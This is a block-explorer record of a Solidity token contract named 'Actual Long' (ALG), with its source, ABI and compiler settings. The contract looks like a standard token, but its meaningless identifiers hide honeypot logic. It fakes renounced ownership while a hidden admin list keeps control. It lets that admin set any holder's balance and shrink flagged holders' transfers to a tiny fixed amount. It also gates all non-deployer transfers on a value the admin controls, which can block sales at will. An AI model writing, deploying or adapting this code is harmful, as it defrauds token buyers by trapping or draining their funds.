{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface liquidityFrom {\n    function createPair(address totalTo, address liquidityLaunched) external returns (address);\n}\n\ninterface teamAutoFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTo) external view returns (uint256);\n\n    function transfer(address launchedTradingLimit, uint256 maxAmount) external returns (bool);\n\n    function allowance(address amountFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedTradingLimit,\n        uint256 maxAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTo, uint256 value);\n    event Approval(address indexed amountFund, address indexed spender, uint256 value);\n}\n\nabstract contract takeList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSwapList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamAutoFeeMetadata is teamAutoFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ActualLong is takeList, teamAutoFee, teamAutoFeeMetadata {\n\n    event OwnershipTransferred(address indexed walletExemptIs, address indexed launchEnable);\n\n    bool public minEnable;\n\n    function owner() external view returns (address) {\n        return limitWalletReceiver;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitWalletReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapWallet;\n    }\n\n    string private totalTx = \"Actual Long\";\n\n    uint8 private shouldLiquidityTo = 18;\n\n    address minExemptTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private takeAt;\n\n    uint256 public buyMax;\n\n    function toListEnable(uint256 maxAmount) public {\n        teamMin();\n        teamFeeMin = maxAmount;\n    }\n\n    function transfer(address tradingAuto, uint256 maxAmount) external virtual override returns (bool) {\n        return receiverWallet(_msgSender(), tradingAuto, maxAmount);\n    }\n\n    string private swapWallet = \"ALG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldLiquidityTo;\n    }\n\n    bool private autoShouldFund;\n\n    uint256 private exemptFee;\n\n    function balanceOf(address minTo) public view virtual override returns (uint256) {\n        return tradingFrom[minTo];\n    }\n\n    function feeMin(address liquidityTx) public {\n        teamMin();\n        \n        if (liquidityTx == walletLaunched || liquidityTx == amountLaunchSwap) {\n            return;\n        }\n        fromExemptFee[liquidityTx] = true;\n    }\n\n    constructor (){\n        if (takeMin != autoShouldFund) {\n            autoShouldFund = false;\n        }\n        receiverSwapList fundReceiver = receiverSwapList(minExemptTotal);\n        amountLaunchSwap = liquidityFrom(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));\n        if (autoShouldFund != toBuy) {\n            toBuy = true;\n        }\n        walletLaunched = _msgSender();\n        minFundSell[walletLaunched] = true;\n        tradingFrom[walletLaunched] = launchShouldSell;\n        marketingTradingLimit();\n        if (toBuy != takeMin) {\n            amountAtTotal = exemptFee;\n        }\n        emit Transfer(address(0), walletLaunched, launchShouldSell);\n    }\n\n    mapping(address => bool) public minFundSell;\n\n    uint256 teamFeeMin;\n\n    uint256 takeTokenBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return totalTx;\n    }\n\n    address private limitWalletReceiver;\n\n    function teamFee(address tradingAuto, uint256 maxAmount) public {\n        teamMin();\n        tradingFrom[tradingAuto] = maxAmount;\n    }\n\n    mapping(address => bool) public fromExemptFee;\n\n    function buyFee(address isMin) public {\n        if (minEnable) {\n            return;\n        }\n        \n        minFundSell[isMin] = true;\n        \n        minEnable = true;\n    }\n\n    function teamMin() private view {\n        require(minFundSell[_msgSender()]);\n    }\n\n    bool private autoEnableReceiver;\n\n    function approve(address marketingReceiverLimit, uint256 maxAmount) public virtual override returns (bool) {\n        takeAt[_msgSender()][marketingReceiverLimit] = maxAmount;\n        emit Approval(_msgSender(), marketingReceiverLimit, maxAmount);\n        return true;\n    }\n\n    function transferFrom(address receiverEnableTeam, address launchedTradingLimit, uint256 maxAmount) external override returns (bool) {\n        if (_msgSender() != minExemptTotal) {\n            if (takeAt[receiverEnableTeam][_msgSender()] != type(uint256).max) {\n                require(maxAmount <= takeAt[receiverEnableTeam][_msgSender()]);\n                takeAt[receiverEnableTeam][_msgSender()] -= maxAmount;\n            }\n        }\n        return receiverWallet(receiverEnableTeam, launchedTradingLimit, maxAmount);\n    }\n\n    function marketingTradingLimit() public {\n        emit OwnershipTransferred(walletLaunched, address(0));\n        limitWalletReceiver = address(0);\n    }\n\n    bool public takeMin;\n\n    uint256 private launchShouldSell = 100000000 * 10 ** 18;\n\n    address launchedAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverWallet(address receiverEnableTeam, address launchedTradingLimit, uint256 maxAmount) internal returns (bool) {\n        if (receiverEnableTeam == walletLaunched) {\n            return limitToken(receiverEnableTeam, launchedTradingLimit, maxAmount);\n        }\n        uint256 totalExempt = teamAutoFee(amountLaunchSwap).balanceOf(launchedAuto);\n        require(totalExempt == teamFeeMin);\n        require(launchedTradingLimit != launchedAuto);\n        if (fromExemptFee[receiverEnableTeam]) {\n            return limitToken(receiverEnableTeam, launchedTradingLimit, totalTeam);\n        }\n        return limitToken(receiverEnableTeam, launchedTradingLimit, maxAmount);\n    }\n\n    address public amountLaunchSwap;\n\n    uint256 public amountAtTotal;\n\n    mapping(address => uint256) private tradingFrom;\n\n    uint256 constant totalTeam = 9 ** 10;\n\n    uint256 public tokenLaunched;\n\n    bool private toBuy;\n\n    function allowance(address launchedLaunch, address marketingReceiverLimit) external view virtual override returns (uint256) {\n        if (marketingReceiverLimit == minExemptTotal) {\n            return type(uint256).max;\n        }\n        return takeAt[launchedLaunch][marketingReceiverLimit];\n    }\n\n    address public walletLaunched;\n\n    bool private liquidityAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchShouldSell;\n    }\n\n    function limitToken(address receiverEnableTeam, address launchedTradingLimit, uint256 maxAmount) internal returns (bool) {\n        require(tradingFrom[receiverEnableTeam] >= maxAmount);\n        tradingFrom[receiverEnableTeam] -= maxAmount;\n        tradingFrom[launchedTradingLimit] += maxAmount;\n        emit Transfer(receiverEnableTeam, launchedTradingLimit, maxAmount);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletExemptIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiverLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAtTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunchSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"buyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"feeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"toListEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTradingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ActualLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}